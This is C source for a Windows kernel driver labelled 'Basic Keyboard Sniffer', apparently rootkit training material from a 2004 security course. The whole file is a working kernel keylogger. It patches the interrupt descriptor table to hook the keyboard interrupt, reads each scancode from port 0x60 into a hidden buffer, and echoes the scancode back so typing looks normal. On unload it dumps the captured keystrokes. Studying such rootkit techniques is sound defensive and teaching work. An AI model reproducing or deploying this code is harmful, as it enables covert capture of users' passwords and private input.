// Basic Keyboard Sniffer
// - v 1.0 Greg Hoglund, BHWindows 2004

#include "ntddk.h"
#include <stdio.h>

#define MAX_IDT_ENTRIES 0xFF

// interrupt
#define MAKELONG(a, b) ((unsigned long) (((unsigned short) (a)) | ((unsigned long) ((unsigned short) (b))) << 16)) 
//#define NT_INT_KEYBD				0xB3
#define NT_INT_KEYBD				0x31

// commands
#define READ_CONTROLLER		0x20
#define WRITE_CONTROLLER	0x60

// command bytes
#define SET_LEDS			0xED
#define KEY_RESET			0xFF

// responses from keyboard
#define KEY_ACK				0xFA	// ack
#define KEY_AGAIN			0xFE	// send again

// 8042 ports
// when you read from port 64, this is called STATUS_BYTE
// when you write to port 64, this is called COMMAND_BYTE
// read and write on port 64 is called DATA_BYTE 
PUCHAR KEYBOARD_PORT_60 = (PUCHAR)0x60;
PUCHAR KEYBOARD_PORT_64 = (PUCHAR)0x64;

// status register bits
#define IBUFFER_FULL		0x02
#define OBUFFER_FULL		0x01

// flags for keyboard LEDS
#define SCROLL_LOCK_BIT		(0x01 << 0)
#define NUMLOCK_BIT			(0x01 << 1)
#define CAPS_LOCK_BIT		(0x01 << 2)

///////////////////////////////////////////////////
// IDT structures
///////////////////////////////////////////////////
#pragma pack(1)

// entry in the IDT, this is sometimes called
// an "interrupt gate"
typedef struct
{
	unsigned short LowOffset;
	unsigned short selector;
	unsigned char unused_lo;
	unsigned char segment_type:4;	//0x0E is an interrupt gate
	unsigned char system_segment_flag:1;
	unsigned char DPL:2;	// descriptor privilege level 
	unsigned char P:1; /* present */
	unsigned short HiOffset;
} IDTENTRY;

/* sidt returns idt in this format */
typedef struct
{
	unsigned short IDTLimit;
	unsigned short LowIDTbase;
	unsigned short HiIDTbase;
} IDTINFO;

#pragma pack()

unsigned long old_ISR_pointer;	// better save the old one!!
unsigned char keystroke_buffer[1024]; //grab 1k keystrokes
int kb_array_ptr=0;

ULONG WaitForKeyboard()
{
	char _t[255];
	int i = 100;	// number of times to loop
	UCHAR mychar;
	
	//DbgPrint("waiting for keyboard to become accecssable\n");
	do
	{
		mychar = READ_PORT_UCHAR( KEYBOARD_PORT_64 );

		KeStallExecutionProcessor(666);

		//_snprintf(_t, 253, "WaitForKeyboard::read byte %02X from port 0x64\n", mychar);
		//DbgPrint(_t);

		if(!(mychar & IBUFFER_FULL)) break;	// if the flag is clear, we go ahead
	}
	while (i--);

	if(i) return TRUE;
	return FALSE;
}

// call WaitForKeyboard before calling this function
void DrainOutputBuffer()
{
	char _t[255];
	int i = 100;	// number of times to loop
	UCHAR c;
	
	//DbgPrint("draining keyboard buffer\n");
	do
	{
		c = READ_PORT_UCHAR(KEYBOARD_PORT_64);
		
		KeStallExecutionProcessor(666);

		//_snprintf(_t, 253, "DrainOutputBuffer::read byte %02X from port 0x64\n", c);
		//DbgPrint(_t);

		if(!(c & OBUFFER_FULL)) break;	// if the flag is clear, we go ahead
	
		// gobble up the byte in the output buffer
		c = READ_PORT_UCHAR(KEYBOARD_PORT_60);
		
		//_snprintf(_t, 253, "DrainOutputBuffer::read byte %02X from port 0x60\n", c);
		//DbgPrint(_t);
	}
	while (i--);
}

// write a byte to the data port at 0x60
ULONG SendKeyboardCommand( IN UCHAR theCommand )
{
	char _t[255];
		
	if(TRUE == WaitForKeyboard())
	{
		DrainOutputBuffer();

		//_snprintf(_t, 253, "SendKeyboardCommand::sending byte %02X to port 0x60\n", theCommand);
		//DbgPrint(_t);

		WRITE_PORT_UCHAR( KEYBOARD_PORT_60, theCommand );
		
		//DbgPrint("SendKeyboardCommand::sent\n");
	}
	else
	{
		//DbgPrint("SendKeyboardCommand::timeout waiting for keyboard\n");
		return FALSE;
	}
	
	// TODO: wait for ACK or RESEND from keyboard	
	
	return TRUE;
}

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	IDTINFO		idt_info;		// this structure is obtained by calling STORE IDT (sidt)
	IDTENTRY*	idt_entries;	// and then this pointer is obtained from idt_info
	char _t[255];

	// load idt_info
	__asm	sidt	idt_info	
	idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase);

	DbgPrint("ROOTKIT: OnUnload called\n");

	DbgPrint("UnHooking Interrupt...");

	// restore the original interrupt handler
	__asm cli
	idt_entries[NT_INT_KEYBD].LowOffset = (unsigned short) old_ISR_pointer;
	idt_entries[NT_INT_KEYBD].HiOffset = (unsigned short)((unsigned long)old_ISR_pointer >> 16);
	__asm sti

	DbgPrint("UnHooking Interrupt complete.");
	
	DbgPrint("Keystroke Buffer is: ");
	while(kb_array_ptr--)
	{
		DbgPrint("%02X ", keystroke_buffer[kb_array_ptr]);
	}
}

// using stdcall means that this function fixes the stack before returning (opposite of cdecl)
void __stdcall print_keystroke()
{
	UCHAR c;
	//DbgPrint("stroke");

	// get the scancode
	c = READ_PORT_UCHAR(KEYBOARD_PORT_60);
	//DbgPrint("got scancode %02X", c);

	if(kb_array_ptr<1024){
		keystroke_buffer[kb_array_ptr++]=c;
	}

	//put scancode back (works on PS/2)
	WRITE_PORT_UCHAR(KEYBOARD_PORT_64, 0xD2); //command to echo back scancode	
	WaitForKeyboard();
	WRITE_PORT_UCHAR(KEYBOARD_PORT_60, c); //write the scancode to echo back
}

// naked functions have no prolog/epilog code - they are functionally like the 
// target of a goto statement
__declspec(naked) my_interrupt_hook()
{
	__asm
	{
		pushad					// save all general purpose registers
		pushfd					// save the flags register
		call	print_keystroke	// call function
		popfd					// restore the flags
		popad					// restore the general registers
		jmp		old_ISR_pointer	// goto the original ISR
	}
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	IDTINFO		idt_info;		// this structure is obtained by calling STORE IDT (sidt)
	IDTENTRY*	idt_entries;	// and then this pointer is obtained from idt_info
	IDTENTRY*	i;
	unsigned long 	addr;
	unsigned long	count;
	char _t[255];
	
	theDriverObject->DriverUnload  = OnUnload; 

	// load idt_info
	__asm	sidt	idt_info
	
	idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase);

	for(count=0;count < MAX_IDT_ENTRIES;count++)
	{
		i = &idt_entries[count];
		addr = MAKELONG(i->LowOffset, i->HiOffset);
		
		_snprintf(_t, 253, "Interrupt %d: ISR 0x%08X", count, addr);
		DbgPrint(_t);
	}

	DbgPrint("Hooking Interrupt...");
	// lets hook an interrupt
	// exercise - choose your own interrupt
	old_ISR_pointer = MAKELONG(idt_entries[NT_INT_KEYBD].LowOffset,idt_entries[NT_INT_KEYBD].HiOffset);
	
// debug, use this if you want some additional info on what is going on
#if 1
	_snprintf(_t, 253, "old address for ISR is 0x%08x", old_ISR_pointer);
	DbgPrint(_t);
	_snprintf(_t, 253, "address of my function is 0x%08x", my_interrupt_hook);
	DbgPrint(_t);
#endif
	
	// remember we disable interrupts while we patch the table
	__asm cli
	idt_entries[NT_INT_KEYBD].LowOffset = (unsigned short)my_interrupt_hook;
	idt_entries[NT_INT_KEYBD].HiOffset = (unsigned short)((unsigned long)my_interrupt_hook >> 16);
	__asm sti

// debug - use this if you want to check what is now placed in the interrupt vector
#if 1
	i = &idt_entries[NT_INT_KEYBD];
	addr = MAKELONG(i->LowOffset, i->HiOffset);
	_snprintf(_t, 253, "Interrupt ISR 0x%08X", addr);
	DbgPrint(_t);	
#endif

	DbgPrint("Hooking Interrupt complete");

	return STATUS_SUCCESS;
}

